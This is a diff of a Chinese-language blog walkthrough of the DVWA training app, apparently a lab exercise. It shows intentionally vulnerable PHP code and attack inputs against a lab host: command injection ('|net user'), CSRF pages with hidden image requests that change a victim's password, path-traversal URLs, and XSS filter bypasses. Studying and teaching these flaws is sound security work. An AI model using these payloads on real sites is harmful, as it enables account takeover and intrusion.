+	<span class="hljs-comment">// Determine OS and execute the ping command.</span>
+	<span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) &#123;
+		<span class="hljs-comment">// Windows</span>
+		$cmd = shell_exec( <span class="hljs-string">'ping  '</span> . $target );
+	&#125;
+	<span class="hljs-keyword">else</span> &#123;
+		<span class="hljs-comment">// *nix</span>
+		$cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );
+	&#125;
 
-    // Feedback for the end user
-    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
-}
+	<span class="hljs-comment">// Feedback for the end user</span>
+	$html .= <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>仍然是过滤符号，发现<code>&#39;| &#39;</code>多了一个空格。于是我们使用|绕过。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk07w955j30nb0btmy0.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk07w955j30nb0btmy0.jpg" srcset="/img/loading.gif"/>
 
 <h4 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h4><p>查看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;
+	<span class="hljs-comment">// Check Anti-CSRF token</span>
+	checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );
 
-    // Get input
-    $target = $_REQUEST[ &#39;ip&#39; ];
-    $target = stripslashes( $target );
+	<span class="hljs-comment">// Get input</span>
+	$target = $_REQUEST[ <span class="hljs-string">'ip'</span> ];
+	$target = stripslashes( $target );
 
-    // Split the IP into 4 octects
-    $octet = explode( &quot;.&quot;, $target );
+	<span class="hljs-comment">// Split the IP into 4 octects</span>
+	$octet = explode( <span class="hljs-string">"."</span>, $target );
 
-    // Check IF each octet is an integer
-    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {
-        // If all 4 octets are int&#39;s put the IP back together.
-        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];
+	<span class="hljs-comment">// Check IF each octet is an integer</span>
+	<span class="hljs-keyword">if</span>( ( is_numeric( $octet[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="hljs-number">4</span> ) ) &#123;
+		<span class="hljs-comment">// If all 4 octets are int's put the IP back together.</span>
+		$target = $octet[<span class="hljs-number">0</span>] . <span class="hljs-string">'.'</span> . $octet[<span class="hljs-number">1</span>] . <span class="hljs-string">'.'</span> . $octet[<span class="hljs-number">2</span>] . <span class="hljs-string">'.'</span> . $octet[<span class="hljs-number">3</span>];
 
-        // Determine OS and execute the ping command.
-        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
-            // Windows
-            $cmd = shell_exec( &#39;ping  &#39; . $target );
-        }
-        else {
-            // *nix
-            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
-        }
+		<span class="hljs-comment">// Determine OS and execute the ping command.</span>
+		<span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) &#123;
+			<span class="hljs-comment">// Windows</span>
+			$cmd = shell_exec( <span class="hljs-string">'ping  '</span> . $target );
+		&#125;
+		<span class="hljs-keyword">else</span> &#123;
+			<span class="hljs-comment">// *nix</span>
+			$cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );
+		&#125;
 
-        // Feedback for the end user
-        $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
-    }
-    else {
-        // Ops. Let the user name theres a mistake
-        $html .= &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;
-    }
-}
+		<span class="hljs-comment">// Feedback for the end user</span>
+		$html .= <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;
+	&#125;
+	<span class="hljs-keyword">else</span> &#123;
+		<span class="hljs-comment">// Ops. Let the user name theres a mistake</span>
+		$html .= <span class="hljs-string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;
+	&#125;
+&#125;
 
-// Generate Anti-CSRF token
+<span class="hljs-comment">// Generate Anti-CSRF token</span>
 generateSessionToken();
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>用<code>|net user</code>试一下。发现被要求输入正确的IP。注入失败。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk0weg12j30nf094q3l.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk0weg12j30nf094q3l.jpg" srcset="/img/loading.gif"/>
 
 <p>直接限制了输入的格式，有效的防止了命令注入漏洞。</p>
 <h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h3><p>跨站请求伪造是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟XSS相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，<strong>CSRF</strong> 利用的是网站对用户网页浏览器的信任。</p>
@@ -633,24 +451,25 @@ generateSessionToken();
 <h4 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h4><blockquote>
 <p> 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
 </blockquote>
-<h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk1e5p8xj30nt09hwex.jpg"/>
+<h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk1e5p8xj30nt09hwex.jpg" srcset="/img/loading.gif"/>
 
 <p><code>http://192.168.1.132/dvwa/vulnerabilities/csrf/?password_new=1234&amp;password_conf=1234&amp;Change=Change#</code></p>
 <p>当受害者点击这个链接，他的密码就会被修改。这个攻击链接很明显。真正攻击场景会对链接做一些处理。比如网址缩短。</p>
 <p>攻击者在网站上搭建攻击页面。如下图所示。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk1n1yjqj30l8072mxa.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk1n1yjqj30l8072mxa.jpg" srcset="/img/loading.gif"/>
 
 <p>该页面源代码为：</p>
-<pre><code class="html">&lt;html&gt;
-&lt;head&gt;
-&lt;title&gt;404&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;img src=&quot;http://192.168.1.132/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;
-&lt;h1&gt;404&lt;h1
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.1.132/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#"</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>/&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span></span>
 &lt;h2&gt;file not found.&lt;h2&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+
 <p>在受害者点击后成功修改密码。</p>
 <h4 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h4><blockquote>
 <p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.1.132），希望通过这种机制抵御CSRF攻击。</p>
@@ -658,23 +477,25 @@ generateSessionToken();
 <p>过滤规则是http包头的Referer参数的值中必须包含受害者主机名（这里是192.168.1.132）</p>
 <p>我们可以将攻击页面命名为192.168.1.132.html（页面被放置在攻击者的服务器里，这里是192.168.1.129）就可以绕过了。</p>
 <p>在攻击端搭建网站，先搭建了一个主页index.html。链接使用的是短链接（有效期7天），就是密码修改链接。</p>
-<pre><code class="html">&lt;!-- /*超链接，点击跳转*/ --&gt;
-&lt;html&gt;
-&lt;body&gt;
-&lt;a href=&quot;192.168.1.132.html&quot; target=&quot;_blank&quot;&gt;11111111&lt;/a&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
+<pre><code class="hljs html"><span class="hljs-comment">&lt;!-- /*超链接，点击跳转*/ --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"192.168.1.132.html"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span>&gt;</span>11111111<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+
 <p>有搭建了一个静态页面，192.168.1.132.html</p>
-<pre><code class="html">&lt;html&gt;
-&lt;head&gt;
-&lt;title&gt;404&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;img src=&quot;http://suo.im/6nTcXO&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;
-&lt;h1&gt;404&lt;h1
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://suo.im/6nTcXO"</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>/&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span></span>
 &lt;h2&gt;file not found.&lt;h2&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+
 <p>在受害者访问这个页面并点击超链接，密码才会被修改。</p>
 <h4 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h4><blockquote>
 <p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
@@ -685,65 +506,72 @@ generateSessionToken();
 </blockquote>
 <h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含漏洞是“代码注入“的一种。代码注入的原理就是注入一段用户能控制的脚本或代码，并让服务端执行。</p>
 <h4 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h4><p>打开测试文件包含漏洞。</p>
-<p><img src="https://s1.ax1x.com/2020/05/10/Y3dH8H.png" alt="Y3wP2.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3dH8H.png" srcset="/img/loading.gif" alt="Y3wP2.png"></p>
 <p>发现有三个文件，点开后发现URL发生了变化，由<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=include.php</code>变成了<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=file1.php</code></p>
-<p><img src="https://s1.ax1x.com/2020/05/10/Y3BS3Q.png" alt="Y3BS3Q.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3BS3Q.png" srcset="/img/loading.gif" alt="Y3BS3Q.png"></p>
 <p>通过./实现不同目录间的访问。</p>
 <blockquote>
 <p>/         根目录<br>./        是当前目录<br>../  返回到上一级目录<br>../../ 返回了两级目录<br>.\ 、..\和./、../意义相同</p>
 </blockquote>
 <p>通过URL可以随意修改要访问的文件。<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\..\wamp\www\dvwa\phpinfo.php</code></p>
-<p><img src="https://s1.ax1x.com/2020/05/10/Y3BAEV.png" alt="Y3BAEV.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3BAEV.png" srcset="/img/loading.gif" alt="Y3BAEV.png"></p>
 <p>查看源代码</p>
-<pre><code>&lt;?php
+<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
 
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
+<span class="php"><span class="hljs-comment">// The page we wish to display</span></span>
+<span class="php">$file = $_GET[ <span class="hljs-string">'page'</span> ];</span>
 
-?&gt;</code></pre><p>从源代码我们可以看到，没有做任何过滤。</p>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
+
+<p>从源代码我们可以看到，没有做任何过滤。</p>
 <h4 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h4><p>查看源代码</p>
-<pre><code>&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
+<span class="hljs-comment">// The page we wish to display</span>
+$file = $_GET[ <span class="hljs-string">'page'</span> ];
 
-// Input validation
-$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
-$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+<span class="hljs-comment">// Input validation</span>
+$file = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">"http://"</span>, <span class="hljs-string">"https://"</span> ), <span class="hljs-string">""</span>, $file );
+$file = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">"../"</span>, <span class="hljs-string">"..\""</span> ), <span class="hljs-string">""</span>, $file );
 
-?&gt;</code></pre><p><img src="https://s1.ax1x.com/2020/05/10/Y30I9e.png" alt="Y30I9e.png"></p>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/10/Y30I9e.png" srcset="/img/loading.gif" alt="Y30I9e.png"></p>
 <p>过滤了<code>http://</code>,<code>https://</code>,<code>../</code>,<code>..\</code>但仍可以使用绝对路径、双写绕过。</p>
-<p><img src="https://s1.ax1x.com/2020/05/10/Y3BeCF.png" alt="Y3BeCF.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3BeCF.png" srcset="/img/loading.gif" alt="Y3BeCF.png"></p>
 <h4 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h4><p>查看源代码</p>
-<pre><code class="\">&lt;?php
+<pre><code class="hljs \">&lt;?php
 
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
+&#x2F;&#x2F; The page we wish to display
+$file &#x3D; $_GET[ &#39;page&#39; ];
 
-// Input validation
-if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
-    // This isn&#39;t the page we want!
-    echo &quot;ERROR: File not found!&quot;;
-    exit;
-}
+&#x2F;&#x2F; Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;
+	&#x2F;&#x2F; This isn&#39;t the page we want!
+	echo &quot;ERROR: File not found!&quot;;
+	exit;
+&#125;
 
 ?&gt;</code></pre>
+
 <p>使用file协议绕过。</p>
 <h4 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h4><p>查看源代码</p>
-<pre><code>&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
+<span class="hljs-comment">// The page we wish to display</span>
+$file = $_GET[ <span class="hljs-string">'page'</span> ];
 
-// Input validation
-if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
-    // This isn&#39;t the page we want!
-    echo &quot;ERROR: File not found!&quot;;
-    exit;
-}
+<span class="hljs-comment">// Input validation</span>
+<span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">"file*"</span>, $file ) &amp;&amp; $file != <span class="hljs-string">"include.php"</span> ) &#123;
+	<span class="hljs-comment">// This isn't the page we want!</span>
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">"ERROR: File not found!"</span>;
+	<span class="hljs-keyword">exit</span>;
+&#125;
 
-?&gt;</code></pre><p>分析源码可以看到,使用白名单,page只能为include.php”、“file1.php”、“file2.php”、“file3.php”之一，只允许包含include.php、file1.php、file2.php、file3.php，不能包含别的文件，彻底杜绝文件包含漏洞</p>
-<p><img src="https://s1.ax1x.com/2020/05/10/Y3B3E6.png" alt="Y3B3E6.png"></p>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>分析源码可以看到,使用白名单,page只能为include.php”、“file1.php”、“file2.php”、“file3.php”之一，只允许包含include.php、file1.php、file2.php、file3.php，不能包含别的文件，彻底杜绝文件包含漏洞</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y3B3E6.png" srcset="/img/loading.gif" alt="Y3B3E6.png"></p>
 <h3 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h3><p>跨站脚本攻击(CrossSite Scripting)，为了和层叠样式表(CascadingStyle Sheets,CSS)的缩写进行区分，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
 <h4 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h4><p>通过脚本语言注入篡改网页，插入恶意脚本，控制用户浏览器的攻击行为。</p>
 <blockquote>
@@ -752,258 +580,267 @@ if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&q
 <p>反射型xss和基于DOM的xss都属于非持久性攻击。存储型xss属于持久性攻击。</p>
 <hr>
 <h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><h5 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h5><p>先查看一下源代码，发现没有任何过滤。</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-header (&quot;X-XSS-Protection: 0&quot;);
+header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
 
-// Is there any input?
-if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
-    // Feedback for end user
-    $html .= &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;
-}
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
+	<span class="hljs-comment">// Feedback for end user</span>
+	$html .= <span class="hljs-string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="hljs-string">'name'</span> ] . <span class="hljs-string">'&lt;/pre&gt;'</span>;
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk21a9uyj30n905bglu.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk21a9uyj30n905bglu.jpg" srcset="/img/loading.gif"/>
 
 <h5 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-header (&quot;X-XSS-Protection: 0&quot;);
+header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
 
-// Is there any input?
-if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
-    // Get input
-    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
+	<span class="hljs-comment">// Get input</span>
+	$name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $_GET[ <span class="hljs-string">'name'</span> ] );
 
-    // Feedback for end user
-    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;
-}
+	<span class="hljs-comment">// Feedback for end user</span>
+	$html .= <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>在输入框输入<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk2q6wc0j30nl0570t0.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk2q6wc0j30nl0570t0.jpg" srcset="/img/loading.gif"/>
 
 <p><code>&lt;script&gt;</code>被过滤掉了。使用<code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk385v0sj30lh05nt8s.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk385v0sj30lh05nt8s.jpg" srcset="/img/loading.gif"/>
 
 <p>除此之外，使用大小写也可以绕过。<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk3nrosxj30n705hjrm.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk3nrosxj30n705hjrm.jpg" srcset="/img/loading.gif"/>
 
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk45rnczj30ky05qq30.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk45rnczj30ky05qq30.jpg" srcset="/img/loading.gif"/>
 
 
 
 <h5 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-header (&quot;X-XSS-Protection: 0&quot;);
+header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
 
-// Is there any input?
-if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
-    // Get input
-    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
+	<span class="hljs-comment">// Get input</span>
+	$name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $_GET[ <span class="hljs-string">'name'</span> ] );
 
-    // Feedback for end user
-    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;
-}
+	<span class="hljs-comment">// Feedback for end user</span>
+	$html .= <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>发现使用了正则表达式进行过滤</p>
 <blockquote>
 <p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $_GET[ ‘name’ ] );</p>
 </blockquote>
 <p><code>&lt;script&gt;</code>标签被过滤。但仍然可以使用img、body、iframe等其他标签注入恶意的js代码。</p>
 <p><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk4u10jlj30kz05ojrg.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk4u10jlj30kz05ojrg.jpg" srcset="/img/loading.gif"/>
 
 <p><code>&lt;svg onload=alert(/xss/)&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk56hhptj30ks05mq30.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk56hhptj30ks05mq30.jpg" srcset="/img/loading.gif"/>
 
 <h5 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-// Is there any input?
-if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
+	<span class="hljs-comment">// Check Anti-CSRF token</span>
+	checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );
 
-    // Get input
-    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );
+	<span class="hljs-comment">// Get input</span>
+	$name = htmlspecialchars( $_GET[ <span class="hljs-string">'name'</span> ] );
 
-    // Feedback for end user
-    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;
-}
+	<span class="hljs-comment">// Feedback for end user</span>
+	$html .= <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;
+&#125;
 
-// Generate Anti-CSRF token
+<span class="hljs-comment">// Generate Anti-CSRF token</span>
 generateSessionToken();
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>看到有一个<code>htmlspecialchars（）函数</code> 。</p>
 <p>这个函数的功能：把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p>
 <p>无法构造标签进行攻击。</p>
 <h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><h5 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
